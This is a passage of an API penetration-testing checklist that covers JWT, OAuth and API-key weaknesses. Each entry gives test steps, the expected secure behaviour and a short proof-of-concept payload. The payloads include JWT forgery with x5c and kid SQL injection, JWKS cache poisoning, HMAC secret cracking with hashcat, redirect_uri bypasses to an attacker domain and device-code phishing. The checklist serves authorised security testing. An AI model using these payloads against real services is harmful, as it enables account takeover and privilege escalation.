openssl req -x509 -newkey rsa:2048 -keyout attacker.key -out attacker.crt -days 1 -nodes

# Forge JWT with x5c
python3 jwt_tool.py <token> -X x -x5c attacker.crt -pk attacker.key

# Forged header structure
{"alg":"RS256","x5c":["<base64_der_encoded_cert>"]}
{"sub":"admin","role":"superadmin","iat":1700000000,"exp":9999999999}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool, openssl

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0106 — JWT kid SQL Injection
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Login — Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Capture JWT with kid header field<br>2. Inject SQL into kid value<br>3. Try UNION-based injection to control secret<br>4. Resign token with controlled secret

**Expected Result:** kid field validated against allowlist; no dynamic DB query using kid

**Payload / PoC Example:**

```
# kid SQLi payloads (kid used to lookup signing key from DB)
{"kid": "x' UNION SELECT 'attacker_secret' -- -", "alg": "HS256"}
{"kid": "x' OR '1'='1", "alg": "HS256"}
{"kid": "../../dev/null", "alg": "HS256"}

# Sign with the injected secret
python3 jwt_tool.py <token> -T -pk "attacker_secret"

# Forged payload
{"sub": "admin", "role": "administrator", "exp": 9999999999}
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool, sqlmap

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0107 — JWKS Cache Poisoning Attack
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** MULTI Authorization: Bearer JWT (header/payload/signature)

**Test Steps:** 1. Time JWKS fetch/cache refresh cycle<br>2. Race to serve attacker JWKS before cache updates<br>3. If server caches attacker key, forge any token<br>4. Exploit during cache miss or forced cache invalidation

**Expected Result:** JWKS fetched from pinned trusted source with certificate pinning; not user-controllable

**Payload / PoC Example:**

```
# Step 1 – Identify JWKS cache TTL
# Monitor timing of JWKS endpoint fetches via OOB
# Or check Cache-Control headers on JWKS response

# Step 2 – Force cache miss / invalidation
GET /api/auth/.well-known/jwks.json?cache_bust=1
POST /api/admin/cache/clear {"type": "jwks"}

# Step 3 – Race to inject attacker JWKS (Turbo Intruder)
# During cache miss window, server fetches JWKS:
# If server fetches from jku header → inject attacker JWKS
{"alg":"RS256","jku":"https://target.com/jwks"}  # Host attacker JWKS at subdomain

# Step 4 – Forge token with attacker key
python3 jwt_tool.py --sign-with-rsa attacker.key
{"sub":"admin","role":"superadmin","exp":9999999999}

# Validate: use forged token on privileged endpoint
GET /api/admin/users HTTP/1.1
Authorization: Bearer <FORGED_TOKEN>
```

**Impact:** JWT forgery/confusion enabling authN bypass &amp; privilege escalation

**Tools:** jwt_tool, Turbo Intruder, Burp Suite

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API2:2023 Broken Authentication

---

## API-0108 — CHAIN: excessive exposure of signing secret -&gt; forge tokens -&gt; ATO
**Phase:** 4-Auth: JWT · **Category:** JWT · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Verbose API response / config / actuator leaking a JWT or reset signing secret

**Test Steps:** 1. Diff raw JSON vs UI; hit /actuator/env, /debug, error traces for secrets<br>2. Recover the JWT signing secret (or reset secret)<br>3. Forge a valid admin JWT offline<br>4. Authenticate as any user

**Expected Result:** Secrets never appear in responses/config; tokens short-lived and rotated

**Payload / PoC Example:**

```
GET /actuator/env  ->  jwt_tool -S hs256 -p '<leaked_secret>' -I -pc role -pv admin
```

**Impact:** Leaked signing secret -&gt; forge arbitrary tokens -&gt; full auth bypass / ATO

**Tools:** jwt_tool, Burp Suite

**References:** -&gt;[JWT checklist](#/checklist/jwt); REST_API TESTING_GUIDE §16 killer-chain ④; Auth0 JWT; RFC 8725; API2:2023 Broken Authentication

---

## API-0109 — Weak HMAC secret brute force
**Phase:** 4-Auth: JWT · **Category:** Secrets · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Capture token<br>2. hashcat -m 16500 jwt.txt rockyou.txt<br>3. Forge new token with cracked secret

**Expected Result:** Use 256-bit random secret

**Payload / PoC Example:**

```
hashcat -m 16500 token.txt wordlist
```

**Impact:** Full ATO

**Tools:** hashcat,john,jwt_tool

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API2:2023 Broken Authentication

---

## API-0110 — Cross-tenant audience mismatch accepted
**Phase:** 4-Auth: JWT · **Category:** Security Misconfiguration · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Capture JWT for service A<br>2. Submit to service B<br>3. Verify if accepted

**Expected Result:** Validate aud claim per service

**Payload / PoC Example:**

```
aud: "api-A" -> use on api-B
```

**Impact:** Cross-service ATO

**Tools:** Manual,jwt_tool

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API2:2023 Broken Authentication

---

## API-0111 — OAuth redirect_uri manipulation
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate flow<br>2. Modify redirect_uri to attacker domain<br>3. Try bypasses: target.com.attacker.com / target.com@attacker.com / //attacker.com

**Expected Result:** Strict allow-list match

**Payload / PoC Example:**

```
redirect_uri=https://target.com@attacker.com
```

**Impact:** Authorization code theft -&gt; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0112 — OAuth state parameter missing or unvalidated
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate flow without state<br>2. Have victim click crafted callback URL<br>3. Account binds to attacker

**Expected Result:** Require and validate state on callback

**Payload / PoC Example:**

```
Remove state from /authorize URL
```

**Impact:** CSRF -&gt; account hijack

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0113 — OAuth PKCE bypass / downgrade
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate flow with PKCE<br>2. Drop code_verifier in token request OR downgrade S256 to plain<br>3. Check token issuance

**Expected Result:** Require PKCE for public clients; enforce S256

**Payload / PoC Example:**

```
Remove code_challenge and code_verifier
```

**Impact:** Authorization code interception

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0114 — OAuth account linking ATO via unverified email
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Register victim email at attacker IDP without verification<br>2. Sign in via SSO using that IDP<br>3. Server links to existing victim account

**Expected Result:** Require email_verified=true from IDP

**Payload / PoC Example:**

```
Login with attacker Google account using victim email
```

**Impact:** Full ATO without password

**Tools:** Manual

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0115 — OAuth Token Theft
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate OAuth flow<br>2. Intercept redirect_uri<br>3. Try stealing authorization code

**Expected Result:** Should validate redirect_uri whitelist

**Payload / PoC Example:**

```
Modify redirect_uri to attacker site
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0116 — OAuth Open Redirect
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate OAuth flow<br>2. Modify redirect_uri with open redirect<br>3. Capture leaked tokens via referrer

**Expected Result:** Should validate redirect_uri strictly

**Payload / PoC Example:**

```
redirect_uri=https://legitimate.com@attacker.com
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0117 — OAuth State Parameter Missing
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate OAuth flow<br>2. Remove or reuse state parameter<br>3. Check for CSRF protection

**Expected Result:** Should require and validate state parameter

**Payload / PoC Example:**

```
Remove state parameter from OAuth request
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0118 — OAuth PKCE Bypass
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Initiate OAuth flow without code_verifier<br>2. Exchange code without code_verifier<br>3. Check if token issued

**Expected Result:** Should enforce PKCE for public clients

**Payload / PoC Example:**

```
Omit code_challenge and code_verifier
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0119 — OAuth Implicit Flow Token Leakage via Referrer
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login — OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Trigger OAuth implicit flow (token in URL fragment)<br>2. Navigate to external link on callback page<br>3. Check Referer header for token leakage

**Expected Result:** Tokens delivered via authorization code flow only; implicit flow disabled

**Payload / PoC Example:**

```
GET /callback#access_token=eyJ...  (then click external link)
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0120 — OAuth2 Token Binding Bypass
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Capture OAuth token<br>2. Use from different client/IP than issued to<br>3. Check if token binding (DPoP) enforced

**Expected Result:** DPoP or MTLS token binding prevents token theft replay

**Payload / PoC Example:**

```
Use stolen Bearer token from different IP/client without DPoP proof
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0121 — OAuth Token Leakage via Referrer
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Complete OAuth flow<br><br>2. Click external link from authenticated page<br><br>3. Check Referrer header on external site<br><br>4. Look for tokens in URL

**Expected Result:** Should not expose tokens in URLs or Referrer headers

**Payload / PoC Example:**

```
Check Referer header for access_token
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0122 — OAuth Scope Escalation
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Request token with limited scope<br><br>2. Intercept token request<br><br>3. Add additional scopes<br><br>4. Check if elevated permissions granted

**Expected Result:** Should only grant requested and approved scopes

**Payload / PoC Example:**

```
scope=read write admin delete
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API5:2023 Broken Function Level Authorization

---

## API-0123 — OAuth Implicit Flow Token Theft
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Use implicit flow (response_type=token)<br><br>2. Capture token from URL fragment<br><br>3. Check token exposure in browser history<br><br>4. Test token replay from different origin

**Expected Result:** Should use authorization code flow with PKCE instead

**Payload / PoC Example:**

```
response_type=token
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0124 — OAuth Authorization Code Injection
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth authorize/token endpoint — redirect_uri/state/code

**Test Steps:** 1. Obtain valid authorization code<br><br>2. Inject code into victim's session<br><br>3. Complete OAuth flow as victim<br><br>4. Check if attacker gains access

**Expected Result:** Should bind authorization code to client session

**Payload / PoC Example:**

```
Inject attacker's auth code into victim callback
```

**Impact:** OAuth flow abuse (redirect/state/PKCE) leading to token theft &amp; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); Salt Labs OAuth research; PortSwigger Academy; API2:2023 Broken Authentication

---

## API-0125 — OAuth device authorization code phishing (RFC 8628)
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Device-code flow — user_code / verification_uri

**Test Steps:** 1. Start the device flow; obtain user_code + verification_uri<br>2. Social-engineer the victim to approve the user_code<br>3. Poll the token endpoint; obtain the victim's access/refresh token<br>4. Note the missing binding between the requesting device and the approver

**Expected Result:** Device flow shows app+scope details, binds approval to the device, rate-limits polling

**Payload / PoC Example:**

```
POST /oauth/device/code -> phish user_code -> poll /oauth/token grant_type=urn:ietf:params:oauth:grant-type:device_code
```

**Impact:** Device-code phishing -&gt; victim-approved token issuance -&gt; account takeover

**Tools:** Burp Suite, custom poller

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); RFC 8628; Salt Labs OAuth research; API2:2023 Broken Authentication

---

## API-0126 — OAuth authorization-code injection / replay across clients
**Phase:** 4-Auth: OAuth · **Category:** OAuth/OIDC · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth callback — code parameter; client_id / redirect_uri / PKCE binding

**Test Steps:** 1. Obtain an authorization code (yours)<br>2. Inject/replay it into a victim session's callback or a different client_id<br>3. Verify code is single-use, client-bound, PKCE-verified, redirect-matched<br>4. Confirm no session/token confusion

**Expected Result:** Codes are single-use, client-bound, PKCE-bound and redirect-matched

**Payload / PoC Example:**

```
GET /callback?code=<attacker_code>&state=<victim_state>
```

**Impact:** Code injection/replay -&gt; session fixation / token theft -&gt; ATO

**Tools:** Burp Suite

**References:** -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); Daniel Fett OAuth Security BCP (RFC 9700); PortSwigger OAuth; API2:2023 Broken Authentication

---

## API-0127 — OAuth client_secret exposure
**Phase:** 4-Auth: OAuth · **Category:** Secrets · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** GET Leaked secrets — repos, JS, mobile bundles, history

**Test Steps:** 1. Inspect JS bundle and APK/IPA<br>2. Search for client_secret in source

**Expected Result:** Secrets only on backend

**Payload / PoC Example:**

```
grep -i client_secret app.apk
```

**Impact:** Full impersonation of OAuth client

**Tools:** Manual,trufflehog

**References:** -&gt;[JavaScript Files checklist](#/checklist/jsfiles); Tomnomnom jsluice/gf; Assetnote JS-analysis; trufflehog/gitleaks; API8:2023 Security Misconfiguration

---

## API-0128 — API key in URL or referrer
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET API key (header/query param)

**Test Steps:** 1. Find requests with ?api_key= in URL<br>2. Check logs / browser history / Referer header on outbound links

**Expected Result:** Send via Authorization header

**Payload / PoC Example:**

```
GET /api/data?api_key=secret
```

**Impact:** Key leak via logs and referer

**Tools:** Manual,Burp

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0129 — API key without scope enforcement
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST API key (header/query param)

**Test Steps:** 1. Use read-only key for write/delete operations<br>2. Test admin endpoints<br>3. Check whether scope checked

**Expected Result:** Enforce per-key scopes

**Payload / PoC Example:**

```
Read key -> POST /admin/users
```

**Impact:** Privilege escalation

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0130 — API key enumeration / weak entropy
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET API key (header/query param)

**Test Steps:** 1. Collect multiple keys<br>2. Burp Sequencer for entropy<br>3. Brute force short / sequential keys

**Expected Result:** Use 32+ char random keys

**Payload / PoC Example:**

```
KEY-0001 KEY-0002 patterns
```

**Impact:** Other tenants' API access

**Tools:** Burp Sequencer,Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0131 — API Key in URL
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Check if API key sent in URL<br>2. Review logs<br>3. Check browser history

**Expected Result:** Should send in headers not URL

**Payload / PoC Example:**

```
GET /api/data?api_key=secret123
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0132 — API Key Without Rotation
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Check if keys can be rotated<br>2. Test if old keys expire<br>3. Verify rotation policy

**Expected Result:** Should support key rotation and expiration

**Payload / PoC Example:**

```
Use 5 year old API key
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0133 — API Key Without Scope/Permissions
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API5:2023 Broken Function Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Use read-only key for write operations<br>2. Test permission enforcement<br>3. Check scope validation

**Expected Result:** Should enforce key permissions

**Payload / PoC Example:**

```
Use read-only key for POST /users
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Suite

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API5:2023 Broken Function Level Authorization

---

## API-0134 — API Key Enumeration
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Test key format and generation<br>2. Try to predict keys<br>3. Brute force short keys

**Expected Result:** Should use cryptographically random keys (32+ chars)

**Payload / PoC Example:**

```
Keys like: KEY-0001, KEY-0002
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API2:2023 Broken Authentication

---

## API-0135 — API Key in Client-Side Code
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Review JavaScript files<br>2. Check mobile app code<br>3. Find exposed keys

**Expected Result:** Should never embed API keys client-side

**Payload / PoC Example:**

```
Keys in .js or mobile app
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual/GitHub Dorking

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API3:2023 Broken Object Property Level Authorization

---

## API-0136 — API Key Without Rate Limiting
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Use same key for 10000 requests<br>2. Check if rate limited<br>3. Test abuse potential

**Expected Result:** Should implement per-key rate limiting

**Payload / PoC Example:**

```
Unlimited requests with one key
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Burp Intruder

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API4:2023 Unrestricted Resource Consumption

---

## API-0137 — API Key in Logs/Error Messages
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API3:2023 Broken Object Property Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Trigger errors<br>2. Check logs and error responses<br>3. Look for exposed keys

**Expected Result:** Should sanitize logs and errors

**Payload / PoC Example:**

```
Key appears in error message
```

**Impact:** Weak/leaked API key grants persistent authenticated access

**Tools:** Manual

**References:** -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Academy Authentication; disclosed ATO writeups; OWASP WSTG; API3:2023 Broken Object Property Level Authorization

---

## API-0138 — No Alert on Key Usage from New IP
**Phase:** 4-Auth: API Keys · **Category:** API Keys · **OWASP API 2023:** API9:2023 Improper Inventory Management · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API Key Management — API key (header/query param)

**Test Steps:** 1. Use key from different geography<br>2. Check if alerts sent<br>3. Test anomaly detection

